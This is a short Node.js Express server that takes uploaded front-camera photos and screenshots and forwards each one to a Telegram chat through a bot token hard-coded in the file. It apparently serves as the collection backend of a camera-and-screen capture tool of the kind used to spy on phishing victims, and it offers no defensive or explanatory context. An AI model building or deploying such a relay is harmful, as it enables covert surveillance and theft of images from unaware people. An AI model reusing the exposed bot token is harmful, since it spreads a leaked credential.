
const express = require('express');
const multer = require('multer');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const bot = new TelegramBot('7279378153:AAGOeGPsR19g-R8XcC9pwo6_YGAmjKrswD8', { polling: false });

const storage = multer.memoryStorage(); // Store uploads in memory for quick sending
const upload = multer({ storage });

app.use(bodyParser.json());

// Route to handle front camera photo uploads
app.post('/upload-photo', upload.single('photo'), (req, res) => {
    const photoBuffer = req.file.buffer;
    bot.sendPhoto('<TELEGRAM_USER_ID>', photoBuffer)
        .then(() => res.send('Photo sent successfully'))
        .catch(err => res.status(500).send(err.message));
});

// Route to handle screenshot uploads
app.post('/upload-screenshot', upload.single('screenshot'), (req, res) => {
    const screenshotBuffer = req.file.buffer;
    bot.sendPhoto('<TELEGRAM_USER_ID>', screenshotBuffer)
        .then(() => res.send('Screenshot sent successfully'))
        .catch(err => res.status(500).send(err.message));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
